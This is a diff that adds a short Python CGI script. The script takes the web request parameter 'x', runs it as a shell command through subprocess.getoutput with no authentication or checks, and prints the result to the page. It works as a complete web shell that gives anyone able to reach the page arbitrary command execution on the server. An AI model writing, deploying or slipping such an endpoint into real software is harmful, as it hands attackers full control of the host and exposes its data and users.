@@ -1,0 +1,17 @@
+#!/usr/bin/python3
+
+import subprocess
+import cgi
+
+
+print("content-type: text/html")
+print()
+
+mydata = cgi.FieldStorage()
+final = mydata.getvalue("x")
+#print(final)
+print()
+o = subprocess.getoutput(final)
+print()
+print()
+print(o)
